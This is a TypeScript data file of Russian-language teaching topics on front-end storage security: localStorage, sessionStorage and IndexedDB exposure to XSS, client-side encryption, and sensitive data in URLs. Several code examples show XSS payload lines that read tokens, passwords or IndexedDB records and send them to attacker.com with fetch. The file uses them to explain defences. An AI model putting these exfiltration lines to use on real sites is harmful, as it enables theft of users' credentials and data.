import { Topic } from '../../../types';

export const SECURITY_DATA_STORAGE_INTERMEDIATE_TOPICS: Topic[] = [
  {
    id: 'data-storage-security',
    title: 'Безопасность localStorage',
    description: 'localStorage уязвим для XSS атак, так как доступен через JavaScript. Важно понимать циклическую зависимость: "localStorage безопасен, если нет XSS" — но если есть XSS, токен украден!',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'data-storage', 'localstorage', 'xss', 'front-end-essential'],
    keyPoints: [
      'localStorage доступен через JavaScript (уязвим для XSS).',
      'XSS → доступ к localStorage → украсть токен.',
      'Циклическая зависимость: "безопасен, если нет XSS" — НЕТ!',
      'Если не уверены в защите от XSS, не храните токены в localStorage.',
      'Лучше использовать HttpOnly cookies для токенов.'
    ],
    examples: [
      {
        title: 'Критично: "localStorage безопасен, если нет XSS" — циклическая зависимость!',
        code: `// ❌ НЕПРАВИЛЬНОЕ понимание:
// "localStorage безопасен, если нет XSS"

// Проблема: циклическая зависимость!
// Если есть XSS → localStorage доступен → токен украден
// Если нет XSS → зачем защита?

// Пример XSS атаки:
// Злоумышленник внедряет:
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);

// Токен украден! ❌

// ✅ ПРАВИЛЬНОЕ понимание:
// localStorage НЕ безопасен для токенов
// Используйте HttpOnly cookies

// HttpOnly cookie недоступна через JavaScript:
// document.cookie не содержит HttpOnly cookie
// XSS не может прочитать токен ✅`
      },
      {
        title: 'Почему не хранить пароли в localStorage',
        code: `// ❌ НИКОГДА не хранить пароли в localStorage!
localStorage.setItem('password', password);

// Проблемы:
// 1. XSS может прочитать пароль
const password = localStorage.getItem('password');
fetch('https://attacker.com/steal?password=' + password);

// 2. Пароль в открытом виде (не зашифрован)

// 3. Пароль доступен через DevTools

// ✅ ПРАВИЛЬНО:
// Пароли НИГДЕ не хранятся на клиенте!
// Только на сервере (хешированные)

// На клиенте:
// - Пароль вводится пользователем
// - Отправляется на сервер (по HTTPS)
// - НЕ сохраняется`
      },
      {
        title: 'Разница между localStorage и sessionStorage',
        code: `// localStorage:
// - Сохраняется до явного удаления
// - Переживает перезагрузку страницы
// - Доступен из всех вкладок того же origin
// - Уязвим для XSS (как и sessionStorage)

localStorage.setItem('data', 'value');
// Данные сохраняются после перезагрузки ✅

// sessionStorage:
// - Удаляется при закрытии вкладки
// - НЕ переживает перезагрузку страницы
// - Доступен только из той же вкладки
// - Уязвим для XSS (как и localStorage)

sessionStorage.setItem('tempData', 'value');
// Данные удаляются при закрытии вкладки ✅

// ⚠️ Оба уязвимы для XSS:
// Злоумышленник может прочитать оба хранилища
const local = localStorage.getItem('token');
const session = sessionStorage.getItem('token');`
      },
      {
        title: 'Шифрование данных в хранилище',
        code: `// Если нужно хранить чувствительные данные:
// 1. Шифрование перед сохранением
import CryptoJS from 'crypto-js';

const secretKey = 'your-secret-key'; // Должен быть безопасным!

function encryptData(data: string): string {
  return CryptoJS.AES.encrypt(data, secretKey).toString();
}

function decryptData(encrypted: string): string {
  const bytes = CryptoJS.AES.decrypt(encrypted, secretKey);
  return bytes.toString(CryptoJS.enc.Utf8);
}

// Сохранение зашифрованных данных
const sensitiveData = 'sensitive information';
const encrypted = encryptData(sensitiveData);
localStorage.setItem('encryptedData', encrypted);

// Чтение и расшифровка
const encrypted = localStorage.getItem('encryptedData');
const decrypted = decryptData(encrypted || '');

// ⚠️ Важно:
// - Ключ должен быть безопасным (не в коде!)
// - Шифрование не защищает от XSS (ключ может быть украден)
// - Лучше не хранить чувствительные данные на клиенте`
      }
    ],
    relatedTopics: ['data-storage-localstorage-sessionstorage', 'xss-basics', 'cookies-token-storage']
  },
  {
    id: 'data-storage-indexeddb',
    title: 'IndexedDB и безопасность',
    description: 'IndexedDB — это более мощное хранилище для больших объемов данных. Как и localStorage, IndexedDB уязвим для XSS и требует тех же мер безопасности.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'data-storage', 'indexeddb', 'xss', 'front-end-essential'],
    keyPoints: [
      'IndexedDB уязвим для XSS (доступен через JavaScript).',
      'Требует тех же мер безопасности, что и localStorage.',
      'Не хранить токены, пароли, персональные данные.',
      'Шифрование данных перед сохранением (если необходимо).',
      'Использовать HttpOnly cookies для критичных данных.'
    ],
    examples: [
      {
        title: 'IndexedDB и безопасность',
        code: `// IndexedDB уязвим для XSS
const request = indexedDB.open('myDB', 1);

request.onsuccess = (event) => {
  const db = event.target.result;
  const transaction = db.transaction(['store'], 'readwrite');
  const store = transaction.objectStore('store');
  
  // Сохранение данных
  store.put({ id: 1, data: 'sensitive' });
  
  // ❌ XSS может прочитать:
  // const request = indexedDB.open('myDB', 1);
  // request.onsuccess = (e) => {
  //   const store = e.target.result.transaction('store').objectStore('store');
  //   store.get(1).onsuccess = (e) => {
  //     const stolen = e.target.result;
  //     fetch('https://attacker.com/steal?data=' + JSON.stringify(stolen));
  //   };
  // };
  
  // ✅ Защита: не хранить чувствительные данные
  // Или шифровать перед сохранением`
      }
    ],
    relatedTopics: ['data-storage-security', 'data-storage-encryption']
  },
  {
    id: 'data-storage-url-sensitive',
    title: 'Сенситивные данные в URL: проблемы с логированием, history API',
    description: 'Сенситивные данные (токены, пароли, персональные данные) никогда не должны быть в URL, так как они попадают в логи сервера, history браузера, referer заголовки и могут быть перехвачены.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'data-storage', 'url', 'sensitive-data', 'front-end-essential'],
    keyPoints: [
      'URL попадает в логи сервера (токены, пароли видны в логах!).',
      'URL сохраняется в history браузера (доступен через history API).',
      'URL отправляется в referer заголовке (может быть перехвачен).',
      'Токены и пароли должны быть в заголовках или теле запроса, не в URL.',
      'Использовать POST для передачи чувствительных данных.'
    ],
    examples: [
      {
        title: 'Проблемы с данными в URL',
        code: `// ❌ НЕПРАВИЛЬНО: токен в URL
fetch('https://api.example.com/data?token=abc123');

// Проблемы:
// 1. Токен попадает в логи сервера
// GET /data?token=abc123
// Логи: [2024-01-01] GET /data?token=abc123

// 2. Токен сохраняется в history браузера
// window.history.back() → виден токен в URL

// 3. Токен отправляется в referer
// Referer: https://api.example.com/data?token=abc123

// 4. Токен может быть перехвачен через proxy/logs

// ✅ ПРАВИЛЬНО: токен в заголовке
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer abc123'
  }
});

// Или в теле запроса (для POST)
fetch('https://api.example.com/data', {
  method: 'POST',
  body: JSON.stringify({ token: 'abc123' })
});

// ✅ ПРАВИЛЬНО: пароль в теле запроса (POST)
fetch('https://api.example.com/login', {
  method: 'POST',
  body: JSON.stringify({ username, password })
});

// ❌ НЕПРАВИЛЬНО: пароль в URL
// fetch('https://api.example.com/login?username=user&password=pass')`
      }
    ],
    relatedTopics: ['data-storage-security', 'auth-credentials']
  }
];
